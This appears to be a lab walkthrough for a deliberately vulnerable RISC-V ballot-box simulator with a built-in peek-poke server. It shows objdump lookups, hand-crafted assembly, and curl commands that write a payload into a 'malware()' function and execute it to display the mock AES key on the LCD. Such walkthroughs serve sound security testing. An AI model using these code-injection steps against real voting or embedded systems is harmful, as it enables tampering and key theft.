This is the simplest example of how to use the peek-poke server. This exploit walks through how to write the ballot box LCD display value to be the location of the AES key.

## Examine the SBB source code & use objdump

Looking at the `fetch_keys` function in the [SBB source code](../../source/crypto/crypto.c#L39), you see the comment:

```
   // we simply return addresses of the hard-coded keys that were linked
    // in at compile time, with the mock key returned in any situation
    // where one of the 3 "real" keys is not asked for
```

Let's go find that hard-coded location. In this example, you'll just look for the mock key. 

```
[nix-shell:~/voting-system]$ riscv32-unknown-elf-objdump -t default_ballot_box_sim.elf | grep "mock_key"
c0082178 l     O .rodata	00000020 mock_key
```

The first field, `c0082178` is the mock_key's memory location. (If this address is different in the output on your system, the source code has probably been updated since this document was written and you'll have to use your value to follow along with the rest of this example.)

For this example, let's get the mock_key to be displayed on the SBB's LCD display. The LCD display currently reads "Welcome, Voter!", so let's first find that string [in the source code](../../source/sbb/sbb_strings.c#L10):

```
const char *welcome_text = "Welcome, Voter!";
```

Great, now let's find the location of the `welcome_text` symbol in the ELF file:

```
[nix-shell:~/voting-system]$ riscv32-unknown-elf-objdump -t default_ballot_box_sim.elf | grep "welcome_text"
c0088258 g     O .sdata	00000004 welcome_text
```

You can see the welcome_text is at `0xc0088258`. 

Now let's write the address of mock_key to the welcome_text location. 

## Create RISC-V 32 bit assembly

You need the RISC-V 32 bit assembly that corresponds to writing the address of the mock_key to the welcome_text location; one tool that provides a helpful interface for doing this is using the online [godbolt compiler explorer.](https://godbolt.org/z/0vfCJw) There may be situations where it will be better to write a small amount of assembly by hand, but here it's easiest to use the compiler.

Let's write a C function that does what you want:

```
void exploit() {
    // get a pointer to the welcome_text
    int *x = (int *)0xc0088258;
    // write the address of the mock_key
    *x = 0xc0082178;
}
```

You can see the generated RISC-V 32 bit assembly in the pane to the right, and pick out the parts that aren't part of the function call setup / tear-down. Be careful as the highlighting on godbolt doesn't always correspond directly to the source code! 

The assembly you want is everything between the stack pointer (`sp`) manipulations:

```
lui a0, 786568
addi a0, a0, 600
sw a0, -12(s0)
lw a0, -12(s0)
lui a1, 786562
addi a1, a1, 376
sw a1, 0(a0)
```

Next, let's save this into a file called `payload.asm`, and get the binary (hex) representation of these instructions. You can then "load" this binary by writing it to the `malware()` function using the peek/poke server, and execute it by running `malware()`. 

## Craft our binary

To craft your desired binary, you need to invoke the RISC-V 32 bit assembler, and grab only the parts of the resulting ELF file that correspond to those instructions. The provided [`run_exploit.sh` script](../run_exploit.sh) will do this for you. 

Let's look at the contents of that script, and then below look at how to use it.

_You don't need to run the code in this section to follow along; it is easier to run the provided `run_exploit.sh` script, as is explained in the next section. Knowing these steps will be useful for other exploits._

The script first calls the assembler:
```
prefix=riscv32-unknown-elf-
tempDir=$(mktemp -d)
...
${prefix}as -o "$tempDir/exploit.elf" "$1"
```

to create an assembled ELF file, and then grab only the `.text` section to get the binary corresponding to your function body while avoiding all the other ELF formatting:

```
${prefix}objcopy -O binary --only-section=.text "$tempDir/exploit.elf" "$tempDir/payload.bin"
```

To `poke` the memory into the `malware()` function, you need to specify how many bytes to write; you can find the size of our binary using `du`:

```
size=$(du -b "$tempDir/payload.bin" | cut -f 1)
```

Finally, you need to call the peek/poke server twice: first to poke our binary into the body of the malware function, and again to run the malware function:

```
curl -v --data-binary @"$tempDir/payload.bin" --request PATCH http://$SBB_IP/poke/$malStartAddr/$size
curl -v http://$SBB_IP/run/0
```

## ./run_exploit.sh

To run `run_exploit.sh` you first need to set two environment variables.

The first is the IP address of the peek/poke server, which you can find published in the Voting Village.

The other is the address to which you want to write your binary payload in the malware function; one easy way to find where to write to is to look at the binary with `riscv32-unknown-elf-objdump -d`.

You should be able to find the `malware` function in the output of `objdump`. 
One complication is that the peek-poke server will only let you write 512 bytes past the beginning on the malware function. (See [here](https://gitlab-ext.galois.com/ssith/voting-system/blob/master/source/protocols/HTTP/peekpoke.c#L63))

So, you can grab the address where the `nop`s start, and add 0x200 to that address, since 512 = 0x200.  For example:

```
c001d170 <malware>:
c001d170:       fe010113                addi    sp,sp,-32
c001d174:       00812e23                sw      s0,28(sp)
c001d178:       02010413                addi    s0,sp,32
c001d17c:       fea42623                sw      a0,-20(s0)
c001d180:       feb42423                sw      a1,-24(s0)
c001d184:       00000013                nop
c001d188:       00000013                nop
c001d18c:       00000013                nop
...
```

Adding on the offset mandate by the server:
```
0xc001d184 + 0x200 = 0xc001d384
```

Set the values you've found as `SBB_IP` and `malware_start_addr`:

```
# don't copy this code directly, find them for your environment as described above
export SBB_IP=192.168.55.247
export malware_start_addr='0xc001d384'
```

Once you've set those two environment variables, you can run the script (which lives one directory down):

```
cd ..
./run_exploit.sh payload.asm
```

This will create the binary corresponding to our assembly instructions, copy that binary into the `malware()` function, and execute it.

## Recap

This example demonstrated how to find the (static) location of the AES key, and expose it by writing to a location which was displayed on the LCD display. To do this you:

* found the interesting pieces of data by inspecting the source code
* found their memory locations by searching the symbol table with `objdump`
* wrote a C function which rewrote data in the SBB code
* compiled it using a RISC-V 32 bit compiler
* ran `./run_exploit.sh` with our assembly as a payload. This:
    * created binary corresponding to the interesting part of the assembly using an assembler & objcopy
    * wrote our crafted binary to the malware function using the poke server
    * executed using malware function, which overwrote the memory using our binary code, by requesting that the server `run` the malware function

